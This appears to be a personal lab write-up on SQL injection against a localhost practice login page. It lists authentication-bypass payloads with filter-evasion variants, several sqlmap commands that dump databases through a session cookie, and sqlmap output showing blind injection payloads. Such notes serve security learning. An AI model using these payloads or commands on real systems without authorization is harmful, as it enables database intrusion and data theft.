
[[1. Introduction to SQL Injection]]
[[1. SQLMAP]]
[[1. SQLi]]

## SQL Injection Checklist for Login Page : 

1. **Test Default Login :**

	- Since i am in the lab, the default creds are : `jeremy:jeremy`.

	- **In Burp Suite :**

```

## REQUEST

POST /labs/i0x02.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/labs/i0x02.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

username=jeremy&password=jeremy

## RESPONSE


HTTP/1.1 200 OK
Date: Sat, 02 Aug 2025 04:48:21 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Set-Cookie: session=6967cabefd763ac1a1a88e11159957db; expires=Sat, 02-Aug-2025 05:48:21 GMT; Max-Age=3600
Refresh: 0; url=/labs/i0x02.php
Vary: Accept-Encoding
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Content-Length: 1928
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


```

2. **Confirm SQLi Vulnerability (Authentication Bypass) :**

```
## - Test Basic Bypass in Repeater:

username=admin' OR 1=1#&password=jeremy
username=jeremy' OR 1=1#&password=jeremy
username=jeremy&password=' OR ''='# 
username=admin' OR '1'='1 -- &password=jeremy
username=jeremy%27%20OR%201=1%23&password=jeremy (encoded)

## - Handle Filters:
	- If ' is blocked, try:
	
username=admin" OR "1"="1#&password=jeremy
username=jeremy%27%20OR%20%271%27=%271%23&password=jeremy

	- If spaces are blocked, use /**/:
	
username=admin'/**/OR/**/1=1#&password=jeremy
```


## Using SQLMAP : 

```
POST /labs/i0x02.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/labs/i0x02.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

username=jeremy&password=jeremy
```

### ✅ 1. Raw Request File

`sqlmap -r request.txt --level=5 --risk=3 --batch --dump`
#### 🔍 What it does :

- Loads a **raw HTTP request** (GET or POST) from a file (`request.txt`)
- sqlmap parses everything: URL, headers, cookies, body
- Tests all parameters inside request (GET, POST, Cookies, etc.)
- Dumps data if injection is found
#### ✅ Use this when :

- - You captured a full login or post-auth request in Burp
- The injection point is deep (e.g. cookie, header, POST field)
- You want **complete control over the entire request**

### ✅ 2. Cookie Injection Without Marker

`sqlmap -u "http://localhost/labs/i0x02.php" --cookie="session=abcdb" --level=5 --risk=3 --dump --batch`
#### 🔍 What it does :

- Targets SQLi at the URL: `/labs/i0x02.php`
- Uses **your provided session cookie**
- **BUT** doesn't specify where in the cookie to inject (no `*`)
- sqlmap **guesses** the injection point
#### ⚠️ Not ideal when :

- You **already know** the cookie is injectable `→` use `*` instead!

### ✅ 3. Cookie Injection With Explicit Marker

`sqlmap -u "http://localhost/labs/i0x02.php" --cookie="session=1*" --level=5 --risk=3 --technique=BEUSTQ --dump`
#### 🔍 What it does :

- Tells sqlmap: "**inject right at the `*` in the cookie value**"
- Focuses only on the **cookie injection point**
- Uses all techniques: Boolean, Error, UNION, Stacked, Time-based, Second-order
- Dumps data if vulnerable
#### ✅ Use this when :

- You know the **session cookie is injectable**
- You want to **speed up testing** and be precise

### ✅ 4. POST Authenticated Attack with Injection Marker 

`sqlmap -u "http://localhost/labs/i0x02.php" --cookie="session=abcdb*" --data="username=jeremy&password=jeremy" --level=5 --risk=3 --technique=BEUSTQ --batch`
#### ### 🔍 What it does:

- Injects **in the cookie**, at the exact `*` location
- Sends **POST data** to simulate a login (`username=jeremy&password=jeremy`)
- Used on **authenticated pages**
- Enables all techniques and batch mode
### ✅ Use this when:

- You're attacking a **login-required** endpoint
- The cookie is **authenticated session**
- You want to **target post-login SQLi in cookies**

### What i found in the SQLi LAB - 2

```
[*] starting @ 05:11:09 /2025-08-05/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[05:11:09] [INFO] resuming back-end DBMS 'mysql' 
[05:11:09] [INFO] testing connection to the target URL
got a refresh intent (redirect like response common to login pages) to '/labs/i0x02.php'. Do you want to apply it from now on? [Y/n] Y
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND 7874=7874-- WGEp

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 8352 FROM (SELECT(SLEEP(5)))QegE)-- MyJh
---
[05:11:09] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.0.12
[05:11:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'

[*] ending @ 05:11:09 /2025-08-05/
```

#### 💥 sqlmap confirmed:

- ✅ Injection is in the **`session` cookie**
    
- ✅ Exploitable via:
    
    - Boolean-based blind
        
    - Time-based blind
        
- ✅ Back-end DBMS: **MySQL ≥ 5.0.12**
    
- ✅ Web app: Apache + PHP on Debian
    
- ✅ Injection works **post-auth** (using `jeremy:jeremy`)
    
- ✅ Payloads stored (cached) in the `.local/share/sqlmap/...` folder